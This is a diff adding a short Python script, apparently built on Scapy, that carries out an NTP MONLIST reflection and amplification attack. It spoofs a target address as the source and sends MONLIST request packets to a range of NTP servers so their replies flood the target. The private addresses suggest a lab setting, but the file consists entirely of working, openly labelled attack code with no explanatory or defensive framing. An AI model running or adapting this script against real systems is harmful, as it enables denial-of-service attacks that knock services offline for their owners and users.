@@ -1,0 +1,18 @@
+# target of the attack
+target="10.0.1.10"
+
+# fill addresses for the ntp servers
+ntpservers=[]
+for x in range(20,36):
+    ntpservers.append("10.0.0."+str(x))
+
+# NTP MONLIST data
+data = "\x17\x00\x03\x2a" + "\x00" * 4
+
+# craft the packets
+packets = IP(dst=ntpservers,src=target)/UDP(sport=RandNum(1024,65535),dport=123)/Raw(load=data)
+
+# send packets once to all nodes
+send(packets)
+
+exit()
